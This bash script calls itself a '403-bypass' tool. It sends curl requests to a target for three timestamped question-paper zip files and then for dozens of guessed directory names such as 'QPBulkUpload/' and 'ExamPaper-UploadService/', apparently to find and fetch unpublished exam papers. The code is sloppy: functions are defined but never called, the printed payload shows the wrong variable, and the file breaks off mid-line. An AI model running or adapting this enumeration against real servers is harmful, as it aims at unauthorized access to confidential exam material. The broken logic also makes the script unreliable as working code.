#!/bin/bash
#color
red='\e[31m'
green='\e[32m'
blue='\e[34m'
cyan='\e[96m'
ltcyan='\e[96m'
yellow='\e[33m'
black='\e[38;5;016m'
bluebg='\e[48;5;038m'${black}
end='\e[0m'
termwidth="$(tput cols)"
function print(){
	status=$(echo ${code} | awk '{print $2}'|sed 's/,$//g')
	if [[ ${status} =~ 2.. ]];then
			printf "${green} ${code} ${end} 👌\n${payload}\n"
	elif [[ ${status} =~ 3.. ]]; then
			printf "${yellow} ${code} ${end}\n"
	elif [[ ${status} =~ 5.. ]]; then
			printf "${ltcyan} ${code} ${end}\n"
	else
			printf "${red} ${code} ${end}\n"
	fi
}
function banner(){
	echo "💀💀💀💀💀💀💀💀💀"
	echo -e "💀$green Have a beer🍺💀 $end"
}
function usage(){
        printf "Usage:\n"
        printf "\t403-bypass [URL]\n">&2
        printf '\n' >&2
        printf "\t-u, --url URL\t\t\ttarget DOMAIN.TLD/PATH\n">&2
		printf '\n' >&2
		printf "BYPASS MODEs\n">&2
		printf "\t--encode\t\t\tURL Encode Bypass\n">&2\
		printf '\n' >&2
		printf "ALL BYPASSES\n">&2
		printf "\t--exploit\t\t\tComplete Scan: 403/401 bypass modes \n">&2
		printf '\n' >&2
		printf "\t${green}GREEN${end}\t:\t${green}2xx Status Code${end}\n">&2
		printf "\t${yellow}YELLOW${end}\t:\t${yellow}3xx Status Code${end}\n">&2
		printf "\t${red}RED${end}\t:\t${red}4xx Status Code${end}\n">&2
		printf "\t${ltcyan}BLUE${end}\t:\t${ltcyan}5xx Status Code${end}\n">&2
}
function URL_Encode_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] URL Encode Bypass "${end}
	echo -e ${blue}"----------------------"${end}
	
	echo -n "Payload [QP02_12_2023%2008_53_31.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_31.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_31.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_32.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_32.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_32.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_33.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_33.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_33.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
 echo -n "Payload ["QPBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadTransfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadTransfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ToolQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ToolQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUploadQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUploadQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileMonitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileMonitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_Q_P/"]: "
